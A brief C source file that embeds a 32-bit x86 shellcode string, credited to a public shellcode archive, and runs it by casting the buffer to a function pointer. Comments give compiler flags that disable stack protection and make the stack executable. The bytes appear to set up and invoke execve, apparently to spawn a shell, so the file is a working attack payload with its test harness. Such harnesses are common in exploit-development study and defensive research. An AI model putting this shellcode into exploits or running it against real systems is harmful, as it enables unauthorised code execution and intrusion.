#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] = \
"\xb1\x09\x8d\x35\xb0\x90\x04\x08\x8d\x3d\xbc\x90\x04\x08\xfc\xf3\xa4\x31\xc0\xbe\xbc\x90\x04\x08\x88\x46\x09\x89\x46\x0a\x89\x46\x0e\xb0\x0b\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80";



int main(int argc, char **argv){
	//original:  http://shell-storm.org/shellcode/files/shellcode-841.php
	//gcc -m32 -fno-stack-protector -z execstack test.c -o test.elf
	
	// int (*FnPtr)() = (int(*)())shellcode;
	// FnPtr();

	(* (int(*)())shellcode)();  // same thing
}
